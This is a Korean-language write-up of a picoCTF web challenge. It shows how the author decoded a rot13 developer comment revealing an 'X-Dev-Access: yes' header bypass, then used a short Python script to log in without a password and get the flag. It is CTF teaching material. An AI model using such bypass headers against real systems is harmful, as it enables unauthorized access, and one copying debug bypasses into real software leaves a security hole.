# Category

web

# Overview

We’re in the middle of an investigation. One of our persons of interest, ctf player, is believed to be hiding sensitive data inside a restricted web portal. We’ve uncovered the email address he uses to log in: ctf-player@picoctf.org. Unfortunately, we don’t know the password, and the usual guessing techniques haven’t worked. But something feels off... it’s almost like the developer left a secret way in. Can you figure it out?
Additional details will be available after launching your challenge instance.

# Analysis

소스 코드 로직에는 특별한 의심되는 부분은 없었다.
다만 주석되어있는 부분에 아래와 같이 production에 올리기 전에는 지우라는 흔적이 남은 주석을 발견했다.

```html
<!-- ABGR: Wnpx - grzcbenel olcnff: hfr urnqre "K-Qri-Npprff: lrf" -->
<!-- Remove before pushing to production! -->
```

첫 번째 주석의 경우 애매하고 읽을 수 없는 문자지만 마지막에 `"K-Qri-Npprff: lrf"`와 같은 형식이 어떤 `key: value`를 나타내는 것과 같은 생각이 들어 `rot13`으로 `decoding`을 했더니 아래와 같이 이해할 수 있는 내용으로 확인이 되었다.

```
ABGR: Wnpx - grzcbenel olcnff: hfr urnqre "K-Qri-Npprff: lrf"
NOTE: Jack - temporary bypass: use header "X-Dev-Access: yes"
```

# Exploitation

숨겨놓은 메시지를 확인한 결과 임시적 바이패스를 하려면 `header`에 `X-Dev-Access: yes` 값을 넣으라고 확인했으니, 로그인 시 제시된 email인 `ctf-player@picoctf.org`와 아무 비밀번호 그리고 헤더값을 추가해 전송하면 `flag`를 얻을 수 있다.

```python
from requests import request as req

res = req(
    url="http://amiable-citadel.picoctf.net:65037/login",
    method="post",
    headers={"X-Dev-Access": "yes",},
    data={"email": "ctf-player@picoctf.org", "password": ""},
)

print(res.text)
```

# Flag

`picoCTF{br...eb}`
